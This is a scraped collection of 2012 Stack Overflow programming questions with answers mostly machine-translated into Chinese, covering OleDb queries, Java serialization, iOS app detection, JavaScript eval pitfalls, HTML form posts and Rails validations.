## 回答 #1

> 赞同：1
> 
> 时间：2012-07-31T09:31:37.240

```
string queryString = "SELECT OrderID, CustomerID FROM Orders WHERE ORDERID >= @StartOrderID AND ORDERID <= @EndOrderID";

    using (OleDbConnection connection = new OleDbConnection(connectionString))
    {
        OleDbCommand command = new OleDbCommand(queryString, connection);
        command.Parameters.Add(new OleDbParameter("@StartOrderID", "PASS THE VALUE HERE"));
        command.Parameters.Add(new OleDbParameter("@EndOrderID", "PASS THE VALUE HERE"));

        connection.Open();
        OleDbDataReader reader = command.ExecuteReader();

        while (reader.Read())
        {
//Retrieve records here
        }
        reader.Close();
    } 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-01T14:35:26.203

根据所有评论和 HatSoft 的代码，我认为您正在寻找。这是伪代码，这意味着它不会编译，但应该让您很好地了解从这里到哪里去。

```
int NumberOfRecordsToRetrieve = 10000;
int StartRecordNumber = 1;
bool EndOfFile = false;

 string queryString = "SELECT OrderID, CustomerID FROM Orders WHERE RECNO() BETWEEN @StartRecordNumber AND @EndRecordNumber"; 

While (!EndOfFile)
{
     using (OleDbConnection connection = new OleDbConnection(connectionString)) 
     { 
         OleDbCommand command = new OleDbCommand(queryString, connection); 
         command.Parameters.Add(new OleDbParameter("@StartRecordNumber", StartRecordNumber)); 
         command.Parameters.Add(new OleDbParameter("@EndRecordNumber", StartRecordNumber + NumberOfRecordsToRetrieve)); 

         connection.Open(); 
         OleDbDataReader reader = command.ExecuteReader(); 

          EndOfFile = true;
          while (reader.Read()) 
          { 
               EndOfFile = false

               //Retrieve records here and do whatever process you wish to do
           } 
           reader.Close(); 

           StartRecordNumber += NumberOfRecordsToRetrieve;
     } 
} 
```

# youtube - Fancybox Youtube Channel Embed

> ID：11736744
> 
> 赞同：0
> 
> 时间：2012-07-31T09:12:27.457
> 
> 标签：youtube, fancybox, youtube-api

Hopefully a simple one - I'm trying to embed my Youtube channel (not a specific video, which is what all existing answers are aimed at, it seems) in a Fancybox. The popup appears fine, but due to Youtube's

```
 X-FRAME-OPTIONS: SAMEORIGIN 
```

... the content isn't displaying. I've included the origin parameter in the URL, but I still get denied due to the above. I'm probably just using the wrong syntax for channels or similar: could anyone help? The URL I'm using (without success) is below (actual channel/domain substituted):

```
 http://www.youtube.com/embed?listType=user_uploads&list=MyChannelName&origin=http://www.mydomain.com/ 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-31T09:21:07.380

对我来说很好 - [http://jsfiddle.net/aTgsN/](http://jsfiddle.net/aTgsN/)

# java - ConnectionString or configuration for mongodb

> ID：11736748
> 
> 赞同：-2
> 
> 时间：2012-07-31T09:12:35.117
> 
> 标签：java, mongodb, hsqldb, vertex, database

I use this configuration to connect to a database hsqldb:

```
<resource Id="My DataSource" type="DataSource">
    JdbcDriver org.hsqldb.jdbcDriver
    JdbcUrl jdbc: hsqldb: file: data / hsqldb / hsqldb
    UserName its
    Password
    JtaManaged true
</ Resource> 
```

What is the configuration for a database mongodb ?

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-07-31T09:34:28.173

您可以在代码中配置 - 如教程[Java 中所演示的 - 建立连接](http://www.mongodb.org/display/DOCS/Java+Tutorial#JavaTutorial-MakingAConnection)，或者您可以将连接字符串格式与[MongoURI](http://api.mongodb.org/java/current/com/mongodb/Mongo.html#Mongo%28com.mongodb.MongoURI%29)一起使用。这是 URI 规范，可以在这里看到[Connection String Format](http://www.mongodb.org/display/DOCS/Connections#Connections-StandardConnectionStringFormat)

# java - 将数据注入 Spring 表单

> ID：11736751
> 
> 赞同：-4
> 
> 时间：2012-07-31T09:12:43.977
> 
> 标签：java, forms, spring-mvc

在我的 Spring`3.1.2.RELEASE`应用程序中，我有一个复杂的表单，**需要注入预定义的 bean**：

```
<util:map id="predefinedLocations" map-class="java.util.LinkedHashMap">
    <entry key="first address" value="Location A" />
    <entry key="another one" value="Location B" />
    <!-- ... -->
</util:map> 
```

我的表单创建如下：

```
@RequestMapping(value = "/create", method = RequestMethod.GET)
public CreationForm createForm() {
    return new CreationForm();
} 
```

**我无法将地图作为**表单的构造函数参数传递，因为我的控制器使用`@Valid`了试图实例化表单的注释。

```
@RequestMapping(value = "/create", method = RequestMethod.POST)
public String create(@Valid CreationForm form, BindingResult formBinding, Model model) {
    if (formBinding.hasErrors()) {
        // PROBLEM HERE
        //
        // View rendering fails because a freshly created CreationForm will be
        // passed to the view so Spring needs to handle the injection of
        // predefinedLocations.
        return null;
    }
    // ...
} 
```

我的第一个想法是使用表单工厂，但在这种情况下我无法实现。

如何将bean*注入*（或*引用*）到我的表单中？`predefinedLocations`

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-31T09:31:03.437

我终于找到了解决方案。

现在在我的控制器中创建了如下表单：

```
@ModelAttribute("creationForm")
private CreationForm getCreationForm() {
    return new CreationForm(predefinedLocations);
} 
```

这样，`@Valid`不会实例化新表单，而是重用先前的实例。

# sharepoint-2010 - SharepPoint 2010 功能升级操作重命名字段声明方式

> ID：11736753
> 
> 赞同：0
> 
> 时间：2012-07-31T09:12:49.837
> 
> 标签：sharepoint-2010, declarative, sharepoint-feature, sharepoint-deployment

我正在研究 Sharepoint 2010 功能升级框架，并且在整个网络上我都看到了如何通过向现有内容类型添加新字段来升级功能的示例，这样做是这样的：

```
 <UpgradeActions>

<VersionRange BeginVersion="0.0.0.0" EndVersion="0.9.9.9">

  <ApplyElementManifests>

    <ElementManifest Location="SomeFunctionality_Iteration2\Elements.xml" />

  </ApplyElementManifests>

  <AddContentTypeField ContentTypeId="0x010073f25e2ac37846bb8e884770fb7307c7"

      FieldId="{536DC46C-DC26-4DB0-A97C-7C21E4362A85}" PushDown="TRUE"/>

  <AddContentTypeField ContentTypeId="0x010073f25e2ac37846bb8e884770fb7307c7"

      FieldId="{4E7A6719-011A-47EA-B983-A4941D688CA6}" PushDown="TRUE"/> 
```

我不明白的是，我将如何升级到将**重命名**、**删除** 或以声明方式从已部署的功能的内容类型更改字段的任何其他属性的功能。

在整个网络上，我看到了如何添加字段的示例，但是如何使用功能版本控制和升级更改现有字段的属性。

谢谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-31T15:51:57.223

您必须使用功能接收器中的代码（在 Feature_Updating 中）来执行此操作。无法使用 CAML 删除或重命名字段。

# java - 序列化在构造函数中初始化的映射

> ID：11736754
> 
> 赞同：9
> 
> 时间：2012-07-31T09:12:52.633
> 
> 标签：java, serialization, hashmap

我刚刚遇到了一个与 Java 序列化相关的有趣问题。

看来，如果我的地图是这样定义的：

```
Map<String, String> params = new HashMap<String, String>() {{
  put("param1", "value1");
  put("param2", "value2");
}}; 
```

我尝试使用 ObjectOutputStream 将其序列化为文件：

```
ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(outputFile));
oos.writeObject(params); 
```

...我得到 java.io.NotSerializableException。

但是，如果我改为以标准方式将值放入地图：

```
Map<String, String> params = new HashMap<String, String>();
params.put("param1", "value1");
params.put("param2", "value2"); 
```

...然后序列化工作正常。

谁能告诉我为什么会发生这种情况以及这些陈述之间有什么区别？我认为他们应该工作相同，但显然我错过了一些东西。

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2012-07-31T09:16:37.200

第一个例子是创建一个匿名内部类。如何 ？

```
Map<String, String> params = new HashMap<String, String>() {}; 
```

将创建一个派生自的新类`HashMap`（注意以下大括号，您可以在其中放置方法、成员等）

然后，您的地图初始化会声明一个初始化程序块：

```
Map<String, String> params = new HashMap<String, String>() { 
                                                             { // here } 
                                                           }; 
```

并且你称之为你的人口方法。

这个成语很好，*但你必须知道你正在创建一个新的类*，而不仅仅是一个新的对象。

因为这个类是一个内部类，它会有一个`this`指向包含外部类的隐式指针。您的匿名类将是可序列化的，因为它是从可序列化类派生的。但是，您的外部类（由`this`指针引用）不是。

像`XStream`通过反射序列化为 XML 的工具会发现`this`指针并尝试序列化周围的对象，这同样令人困惑。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-11-15T21:15:35.483

我想用这个建议补充@Brian Agnew 的回答：

我有一个案例，我需要一个对象的行为略有不同，所以我用匿名内部类扩展了它的功能，就像你在示例中所做的那样。外部类是一个 GUI 应用程序，我没有使其可序列化，因为这不是必需的，因此就像@Brian 所说，没有匿名内部类可以序列化，即使它们扩展的类是可序列化的。

在这种情况下，您只需为反序列化类和再次序列化类定义不同的行为。如果您有一个具有特定构造函数的类，请在您的类中使用如下方法：

```
public FunctionalObject getNewFunctionalObject (String param1, String param2) {
    // Use an anonymous inner class to extend the behavior
    return new FunctionalObject (param1, param2) {
        { 
            // Initialization block code here
        }
        // Extended behavior goes here
    };
} 
```

所以当你反序列化时，你可以这样调用：

```
FunctionalObject fo = (FunctionalObject) objectInputStream.readObject ();
fo = getNewFunctionalObject(fo.getParam1(), fo.getParam2()); 
```

序列化时，您需要创建一个`new`对象，它是旧对象的克隆。有些类内置了这种行为，而在其他类中，您必须专门定义它。对于序列化，如果你有一个可以克隆它的构造函数，或者你的类`clone`定义了方法，你可以这样做：

```
objectOutputStream.writeObject ( fo.clone() ); 
```

然后，该`clone`对象的 将不再是对匿名内部类的引用，而是对对象的实际副本的引用，该副本是可序列化的。

在您的示例中，您可以这样做：

```
// Assuming objectOutputStream has already been defined
Map<String, String> params = new HashMap<String, String>() {{
    put("param1", "value1");
    put("param2", "value2");
}};
objectOutputStream.writeObject (new HashMap<String,String> (params)); 
```

这是有效的，因为`HashMap`该类有一个构造函数，它将返回`HashMap`传递给它的任何内容的克隆。说一些简单的话是很多话，但我希望我自己能早点得到这个建议。

# iphone - 如何检查特定应用程序是否已安装在 iPhone 设备上？

> ID：11736756
> 
> 赞同：0
> 
> 时间：2012-07-31T09:13:05.193
> 
> 标签：iphone

如何检查特定应用程序是否已安装在 iPhone 设备上？我们怎样才能实现这个任何想法？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-31T09:17:16.630

`canOpenURL`本质上是检查注册到该特定 URL 方案的应用程序是否已安装，或者换句话说，该应用程序是否存在，如果存在，我们可以打开 URL。

```
- (BOOL) appExists: (NSURL*)url{
    if ([[UIApplication sharedApplication] canOpenURL:url]) {        
        return YES;

    } else {
        return NO;
    }
}

NSURL *urlApp = [NSURL URLWithString:@"fb://profile/73728918115"];// facebook app

NSURL *urlApp = [NSURL URLWithString: [NSString stringWithFormat:@"%@", @"twitter:///user?screen_name=INNOVA_ET_BELLA"]];//tweeter app

if ([self appExists:urlApp]) {
        [[UIApplication sharedApplication] openURL:urlApp];
} 
```

iPhone URL 方案：

```
http://wiki.akosma.com/IPhone_URL_Schemes 
```

自定义 URL 方案：

```
http://mobiledevelopertips.com/cocoa/launching-your-own-application-via-a-custom-url-scheme.html 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-31T09:26:08.270

使用下面的代码，您可以检索所有应用程序的列表。

```
 NSString *bundleRoot = [[NSBundle mainBundle] bundlePath];
 NSString *sandBoxPath = [bundleRoot stringByDeletingLastPathComponent];
 NSString *appFolderPath = [sandBoxPath stringByDeletingLastPathComponent];

 NSFileManager *fm = [NSFileManager defaultManager];
 NSArray *dirContents = [fm contentsOfDirectoryAtPath:appFolderPath error:nil];

 NSMutableArray *appNames = [[NSMutableArray alloc]init];
 for(NSString *application in dirContents)
 {
      NSString *appPath = [appFolderPath stringByAppendingPathComponent:application];
      NSArray *appcontents = [fm contentsOfDirectoryAtPath:appPath error:nil];
      NSPredicate *fltr = [NSPredicate predicateWithFormat:@"self ENDSWITH '.app'"];
      NSArray *onlyApps = [appcontents filteredArrayUsingPredicate:fltr];
      if(onlyApps.count > 0)
           [appNames addObject:[onlyApps objectAtIndex:0]];
 }

 NSLog(@"%@", [appNames description]);
 [appNames release]; 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-07-31T09:32:22.837

如果应用程序有注册的 URL，您可以通过这种方式检查是否存在

```
[[UIApplication sharedApplication] canOpenURL:url] 
```

URL 类似于`skype://`

如果没有，您需要循环访问所有文件夹。
此处如何：[使用 glob 获取目录中的文件列表](https://stackoverflow.com/questions/499673/getting-a-list-of-files-in-a-directory-with-a-glob)

```
NSString *bundleRoot = [[NSBundle mainBundle] bundlePath];
NSFileManager *fm = [NSFileManager defaultManager];
NSArray *dirContents = [fm contentsOfDirectoryAtPath:bundleRoot error:nil];
NSPredicate *fltr = [NSPredicate predicateWithFormat:@"self ENDSWITH '.app'"];
NSArray *onlyAPPs = [dirContents filteredArrayUsingPredicate:fltr]; 
```

应用程序位于`/var/application/APPNAME.app`（如果我没记错的话）。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-01-24T04:30:49.873

这是一个测试是否安装了 facebook 应用程序的示例。

```
if ([[UIApplication sharedApplication] canOpenURL:[NSURL URLWithString:@"fb://"]]) {
// Facebook app is installed
 } 
```

# asp.net - Devexpress Xtrareports databound generates (unwanted) pagebreak after each record

> ID：11736757
> 
> 赞同：0
> 
> 时间：2012-07-31T09:13:13.353
> 
> 标签：asp.net, devexpress, xtrareport

Using devexpress xtrareports version 11.2 I have setup a databound report using a temporary table. I bind the content to a single xrrichttext on the report.

Each record is generated and each next record starts on a new page. Now I want to lose the automatic pagebreak and implement my own logic for breaking.

But I have not yet been able to drop the auto-break. I went through all the pagebreak properties in design mode but everything is already set to none.

Besides the xrrichtext there is also a xrpanel which contains a xrlabel, all are set to a low height as default with cangrow/canshrink to true.

Is there something specific I can set for this or am I still missing something?

edit: I am using the detailband, I had given the xrrichtext a minimal height after realizing this might be the problem, but this didnot seem to help. But after I restarted this did however fix the problem.

But now my own pagebreaks are not working as expected, not sure if I should start another question for this.

In the detailband I have added a xrpagebreak. In the detail_beforeprint I check if the current records needs a pagebreak

```
 If GetCurrentColumnValue("break") = True Then
        xrPageBreak1.Visible = True
    Else
        xrPageBreak1.Visible = False
    End If 
```

Only now I am getting a pagebreak for every record, doesnot seem to react on the value for field 'break'?

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-31T14:07:39.850

您使用的是哪个报告波段？

一些报表带在每页上只出现一次，通常数据会添加到详细带中，直到页面满为止。或者直到你自己打破页面

# javascript - Why does isNaN for form input true for a string only if I enter quotes around it?

> ID：11736761
> 
> 赞同：1
> 
> 时间：2012-07-31T09:13:18.517
> 
> 标签：javascript, validation

I've seen this in JavaScript in numerous examples but I can't get this to work for me. I must be overlooking something, so I would appreciate a kind soul helping me out here because I am new to JavaScript:

```
 spend=eval(form.spend.value);
 if(isNaN(form.spend.value)) {
     alert('I am not a number');
 } 
```

The above form input is gathered from:

```
<input type=text name=spend value="" size=6 STYLE="background-color: #EDEDE8;"> 
```

If I enter in abc as input, the alert I am not a number doesn't display. If I enter "abc" with quotes around is, it does display the alert.

I am checking input from the form where the user should only be allowed to enter numbers. Only numbers should be accepted. Thank you!

Edit: spend is US dollar amount. So it needs to be able to accept amounts such as 123.45. Edit2: Sorry, num is indeed form.spend.value.

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-31T09:24:32.980

检查此代码，它的工作。
js：

```
function abc(){
var aa = document.getElementById('myid').value;
if(isNaN(aa)) {
 alert('I am not a number');
}
} 
```

形式 ：

```
<input type=text name=spend value="" id="myid" size=6 STYLE="background-color: #EDEDE8;">
    <input type="button" onClick="abc();"> 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-31T09:25:31.327

因为这不是处理数字的正确方法。

```
spend=eval(form.spend.value); // Problem is on this line
if(isNaN(form.spend.value)) {
    alert('I am not a number');
} 
```

例如，如果有人输入某些内容，`form.spend.value`例如`alert("foolish")`您会惊讶地看到它正在执行，例如`eval("alert(\"foolish\")")`

如果它`this_is_an_undefined_variable_name`引发错误并终止脚本，这就是您看不到警报的原因。

如果它类似于`"hihi"`，因为这是一个有效的 JavaScript**字符串**，所以不会引发错误，您将看到警报。

就像 James McLaughlin 指出的那样，您应该使用正确的函数来处理数字。

* * *

顺便说一句，最好正确编写 HTML（引用属性）：

```
<input type="text" name="spend" id="spend" value="" size="6" STYLE="background-color: #EDEDE8;"> 
```

并使用更好的方法来检索表单（使用`document.getElementsByName`也可以）：

```
spend=parseFloat(document.getElementById("spend").value);
// OR
spend=parseFloat(document.getElementsByName("spend")[0].value);

if(isNaN(spend)) {
    alert('I am not a number');
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-07-31T09:19:14.917

> 如果我输入 abc 作为输入，则不会显示“我不是数字”的警报。如果我输入带有引号的“abc”，它会显示警报。

那是因为脚本在到达警报之前出错并死亡。

```
> var form = { spend: { value: 'abc' } };
>  spend=eval(form.spend.value);
ReferenceError: abc is not defined 
```

如果该值在其周围有引号（即`'"abc"'`），那么它将被评估为字符串文字而不是变量。

你不应该把`eval`任何地方放在用户输入附近。只需删除该行。

# python - 为什么 PyObject* 可以指向 python 中的任何对象？

> ID：11736762
> 
> 赞同：5
> 
> 时间：2012-07-31T09:13:20.060
> 
> 标签：python, c

在python的源代码中，有一些宏定义是这样的：

```
#define PyObject_HEAD    \
    int ob_refcnt;       \
    struct _typeobject *ob_type;

#define PyObject_VAR_HEAD  \
    PyObject_HEAD          \
    int ob_size; 

typedef struct _object {  
    PyObject_HEAD  
} PyObject;    

typedef struct _object {  
    PyObject_HEAD   
    long ob_ival;   
} PyIntObject;   

typedef struct {   
    PyObject_VAR_HEAD   
} PyVarObject; 
```

问题是，为什么 PyObject* 可以指向 python 中的每个对象（如 PyIntObject、PyVarObject）？

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2012-07-31T09:33:59.577

不同类型的 Python 对象的每个结构都有一个实例`PyObject_HEAD`作为其第一个成员（或其第一个成员的第一个成员，依此类推）。

该成员子对象保证与完整对象位于同一地址。

该`PyObject_HEAD*`成员子对象上的点，但一旦`ob_type`被检查以确定完整类型是什么，就可以转换为完整类型。

这个技巧并不是 CPython 独有的——它通常用于在 C 中实现一种有限的继承。基本上，您可以通过“在开头有一个 X”来建模“是一个 X”关系。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-07-31T09:16:45.203

因为`PyObject_HEAD`始终是第一个不受具体基础类型影响的结构成员。指针当然会被强制转换。

# mono - ABBYY Mobile + MONO

> ID：11736763
> 
> 赞同：1
> 
> 时间：2012-07-31T09:13:24.517
> 
> 标签：mono, abbyy

I'm an student and I'm trying to develop a reader for low vision users using OCR utilities. I'm debating to use MONO because I'm familiar with c#. Is it possible to combine ABBYY mobile in a MONO project(Android or IOS)?

Thx

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2016-04-18T04:10:12.530

不，它会非常慢。

# javascript - Javascript将对象分解为参数

> ID：11736766
> 
> 赞同：2
> 
> 时间：2012-07-31T09:13:32.080
> 
> 标签：javascript, foreach, arguments, exploded

有没有办法在javascript中进行以下工作？

```
var orders = [
   {milk: true, sugar: "extra"}, 
   {milk: false, sugar: "normal"}
   ];

function makeCoffee(sugar, milk) {
    console.log(sugar);
    console.log(milk);
}

orders.forEach(makeCoffee); 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-31T09:29:38.283

正如我在评论中所说，在`func.toString()`返回函数^(†</sup> 源的浏览器中，您可以解析签名并提取参数名称：)

```
var arg_names = makeCoffee.toString()
            .match(/function[^(]*\(([^)]*)\)/)[1].split(', ');

orders.each(function(order) {
    makeCoffee.apply(null, arg_names.map(function(name) {
        return order[name];
    });
}); 
```

由于 JavaScript 不提供任何反射 API，这可能是唯一的方法。

* * *

如果您没有明确说明您的代码在哪些浏览器中受支持，这可能不起作用（我不知道 IE 返回什么`func.toString`）。我仍然建议将对象作为参数传递。

* * *

†：函数的确切表示取决于实现。以下是规范中的相应描述：

> 返回函数的依赖于实现的表示。此表示具有 a 的语法`FunctionDeclaration`。请特别注意，在表示字符串中使用和放置空格、行终止符和分号是依赖于实现的。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-31T09:13:32.080

到目前为止，我能想到的最好的是：

```
function makeCoffee() {
    console.log(this.milk);
    console.log(this.sugar);
}

orders.forEach(function(x) {makeCoffee.call(x)}) 
```

优点：

*   作品

缺点（海事组织）：

*   它在 order 和 makeCoffee 之间引入了不必要的耦合（有点像组合与继承之间的关系）。
*   我们失去了声明其输入的 makeCoffee 函数的明确性

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-07-31T09:24:11.503

我推荐这个：

```
//Should go to config.js
var COFFEE_SUGAR_DEFAULT="normal";

var orders = [
   {milk: true, sugar: "extra"}, 
   {milk: false, sugar: "normal"}
   ];

function makeCoffee(coffeeDefinition) {
    if (!coffeeDefinition.sugar) coffeeDefinition.sugar=COFFEE_SUGAR_DEFAULT;
    if (!coffeeDefinition.milk) coffeeDefinition.milk=false; //might not be a real boolean
    console.log(coffeeDefinition.sugar);
    console.log(coffeeDefinition.milk);
}

orders.forEach(function(x) {makeCoffee(x)}) 
```

优点：

*   工作并且很健壮
*   只引入了必要的耦合
*   可扩展到例如`"decaffeinated":false`

缺点：

*   不漂亮

# macos - Failed in deleting file in main bundle under sandbox

> ID：11736769
> 
> 赞同：1
> 
> 时间：2012-07-31T09:13:36.817
> 
> 标签：macos, cocoa, sandbox, file-management

I am trying to delete a file in the main bundle of my app in code. What I am trying is: get the file path via [[NSBundle mainBundle] pathForResource:ofType:], then try to delete it via [[NSFileManager defaultManager] removeItemAtPath:].

My problem is, my app is sandboxed, so I got information like this: sandboxd deny file-write-unlink ...

Is there a way to overcome this? Any idea would be appreciated.

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-31T09:29:07.943

您不能删除自己沙箱中的文件，因为它会破坏用于验证您的应用程序有效性的数字签名。

如果你想拥有可以以这种方式操作的文件，那么你需要将它们从你的包中复制到缓存目录中，你可以在其中对它们做任何你喜欢的事情。

# android - 是否有可能在选项卡上显示进度对话框？

> ID：11736770
> 
> 赞同：0
> 
> 时间：2012-07-31T09:13:42.123
> 
> 标签：android, progressdialog

我想在选项卡上显示进度对话框，以便我可以更改选项卡。我的进度条全屏显示，因此我无法更改标签。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-31T09:16:38.323

是的，当然您可以显示**进度对话框，`setCancelable(false)`**以便用户无法更改选项卡。

但是你在显示进度条时遇到了什么问题？

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-31T09:26:10.530

ProgressDialog 需要当前显示窗口的上下文，我认为您正在关注 TabGroupActivity 示例，您应该通过以下语句初始化 ProgressDialog：

```
ProgressDialog pd=ProgressDialog.show(getParent(), "title", "message"); 
```

# forms - 通过 post 将 html 表单发送到 web 服务

> ID：11736775
> 
> 赞同：3
> 
> 时间：2012-07-31T09:14:01.653
> 
> 标签：forms, html, post

我对 HTML5 开发非常陌生，这个问题可能非常愚蠢，但我已经找到了答案（或者我搜索得很好）。

我想通过 post 将表单发送到 Web 服务（我不想在 URL 中显示所有字段）。

我有两个问题：

1.  **我必须如何命名表单字段？如果我尝试发送一个`userName`我认为我必须将此测试作为 ID 放入将保存该值的字段。**
2.  这是因为我很好奇。发送到 Web 服务的 post 消息内容是什么？

这是我在互联网上找到的一个例子：

```
 <FORM action="http://somesite.com/prog/adduser" method="post">
    <P>
    <LABEL for="firstname">First name: </LABEL>
              <INPUT type="text" id="firstname"><BR>
    <LABEL for="lastname">Last name: </LABEL>
              <INPUT type="text" id="lastname"><BR>
    <LABEL for="email">email: </LABEL>
              <INPUT type="text" id="email"><BR>
    <INPUT type="radio" name="sex" value="Male"> Male<BR>
    <INPUT type="radio" name="sex" value="Female"> Female<BR>
    <INPUT type="submit" value="Send"> <INPUT type="reset">
    </P>
 </FORM 
```

我想我需要这些 id 来获取这些值，同时在 Web 服务上处理它们，不是吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-31T09:25:09.410

这取决于，您可以通过重定向向页面发布帖子（在 .NET 中您可以这样处理）：

```
<form action="http://myurl/postpage.ashx" method="post">
    <input name="forename" />
    <input name="surname" />
    <input type="submit" value="Submit" />
</form> 
```

然后在**postpage.ashx**的服务器端脚本中使用：

```
string forename = Request["forename"];
string surname = Request["surname"]; 
```

您还可以使用 jQuery 使用以下命令对同一页面进行 ajax 调用：

```
var forename = $("input[name=\"forename\"]").val();
var surname = $("input[name=\"surname\"]").val();

$.ajax({
    url: "http://myurl/postpage.ashx",
    type: "POST",
    async: true, // set to false if you don't mind the page pausing while waiting for response
    cache: false,
    dataType: "json",
    data: "{ 'forename': '" + forename + "', 'surname': '" + surname + "' }",
    contentType: "application/json; charset=utf-8",
    success: function(data) {
        // handle your successful response here
    },
    error: function(xhr, ajaxOptions, thrownError) {
        // handle your fail response here
    }
}); 
```

您将以相同的方式处理服务器端代码中的帖子。这里要注意的关键是，无论您作为输入元素的**名称**属性输入什么，都会作为键/值对发布到您的接收 URL。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-31T09:17:24.133

每个 Web 服务都应该为您提供类似于[WSDL](http://www.w3.org/TR/wsdl)的东西，它通常包含您可以使用的可用字段和方法的规范。如果您要连接的 web 服务有 url ，则`webservice.com`尝试`webservice.com/wsdl`获取[WSDL](http://www.w3.org/TR/wsdl)。

检查此主题：[单击](https://stackoverflow.com/questions/8753098/how-get-html-post-data-and-pass-to-a-webservice)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-07-31T09:26:08.970

属性“名称”是唯一的，以便将该参数传递给 Servlet（或任何地方）。然后 post 方法对消息进行加密并将其发送到 Servlet。

```
<form method="post" action = "LoginServlet">
     Name: <input type="text" name="userName">
     Password: <input type="password" name="password"> 

    <input type="submit" name = "Login" class="button">
</form> 
```

为了访问该数据，您将在 Servlet 中执行以下操作：

```
String userName = request.getParameter("userName"); 
```

# ruby-on-rails - Rails 3 - 自定义验证

> ID：11736786
> 
> 赞同：25
> 
> 时间：2012-07-31T09:14:43.957
> 
> 标签：ruby-on-rails, ruby-on-rails-3, activerecord

我对我在 Rails 3 中的自定义验证选项感到有些困惑，我希望有人能指出可以帮助我解决当前问题的资源的方向。

我目前有 3 个模型`vehicle`，`trim`和`model_year`。它们如下所示：

```
`class Vehicle < ActiveRecord::Base
  attr_accessible :make_id, :model_id, :trim_id, :model_year_id
  belongs_to :trim
  belongs_to :model_year
end

class ModelYear < ActiveRecord::Base
  attr_accessible :value
  has_many :model_year_trims
  has_many :trims, :through => :model_year_trims
end

class Trim < ActiveRecord::Base
  attr_accessible :value, :model_id
  has_many :vehicles
  has_many :model_year_trims
  has_many :model_years, :through => :model_year_trims
end` 
```

`我的查询是这样的 - 当我创建车辆时，如何确保选择的 model_year 对装饰有效（反之亦然）？`

 `* * *

## 回答 #1

> 赞同：63
> 
> 时间：2012-07-31T09:42:19.833

您可以使用自定义验证方法，如此[处](http://guides.rubyonrails.org/v3.2.13/active_record_validations_callbacks.html#custom-methods)所述：

```
class Vehicle < ActiveRecord::Base
  validate :model_year_valid_for_trim

  def model_year_valid_for_trim
    if #some validation code for model year and trim
      errors.add(:model_years, "some error")
    end
  end

end 
```

* * *

## 回答 #2

> 赞同：28
> 
> 时间：2012-07-31T09:44:58.677

您可以`ActiveModel::Validator`像这样使用该类：

```
class VehicleValidator < ActiveModel::Validator
  def validate(record)
    return true if # custom model_year and trip logic
    record.errors[:base] << # error message
  end
end

class Vehicle < ActiveRecord::Base
  attr_accessible :make_id, :model_id, :trim_id, :model_year_id
  belongs_to :trim
  belongs_to :model_year

  include ActiveModel::Validations
  validates_with VehicleValidator
end 
````

# asp.net-mvc-3 - 我在表格的每一行都有@Ajax.BeginForm，当我使用该表格发出发布请求时，除了第一行之外，模型为空

> ID：11736791
> 
> 赞同：1
> 
> 时间：2012-07-31T09:15:10.860
> 
> 标签：asp.net-mvc-3, razor

我在表格的每一行都有@Ajax.BeginForm，当我使用该表格发出发布请求时，除第一行外，模型为空。

只有第一个表格有效，第二个表格无效......我使用了唯一的表格ID。

可能是因为我使用的是 IList 和 for 循环，

AND 第一个表单具有控件名称，如 [0].lstMatches[4].match_set_name 和第二、第三、....表单具有控件名称，如 [n].lstMatches[4].match_set_name

并且 IList 只能为第一个提供模型，[0].lstMatches[4].match_set_name

这是我的视图结构

```
 @model IList<QIOnlineMVC3.Models.TravelAdsRulesMatchsGroups>
@{
ViewBag.Title = "Business Rule Travel Ads";
ViewBag.Layout = "_Layout2";
 }

 <table id="PageSortTable" class="travelads_business_rules" cellspacing="0">
<tr></tr>
 <tbody>
@for (var i = 0; i < Model.Count; i++)
    {
<tr class="minimised" id='trMinimised@(Model[i].id)'>
            <td colspan="13">
                @using (Ajax.BeginForm("_SaveGroupMatchs", null, new AjaxOptions { OnSuccess = "onSuccess", UpdateTargetId = "msgResult", LoadingElementId = "msgLoading", HttpMethod = "Post" }, new { @id = "SaveForm" + Model[i].id.ToString() }))
                {  
 <div class="detail">
  <div class="table_header">
                        <span class="col_a">Group</span> <span class="col_b">Group Scope</span> <span class="col_c">
                            Seq</span> <span class="col_d">&nbsp;</span> <span class="col_e">ID</span> <span
                                class="col_f">Match Location</span> <span class="col_g">Target Field</span>
                        <span class="col_h">Match Type</span> <span class="col_i">Set Name</span>
                    </div>
                    <!-- Loop for matches -->
                    <!-- start GROUP -->
                    <div class="group" id="Group_rule_@(Model[i].id)">

                       @Html.HiddenFor(model => @Model[i].id)
                       @Html.HiddenFor(model => @Model[i].ad_rule_name)
                       @Html.HiddenFor(model => @Model[i].ad_rule_desc)
                       @Html.HiddenFor(model => @Model[i].business)
                       @Html.HiddenFor(model => @Model[i].ad_region)
                       @Html.HiddenFor(model => @Model[i].ad_form)
                       @Html.HiddenFor(model => @Model[i].ad_company)
                       @Html.HiddenFor(model => @Model[i].ad_team)
                       @Html.HiddenFor(model => @Model[i].ad_language)
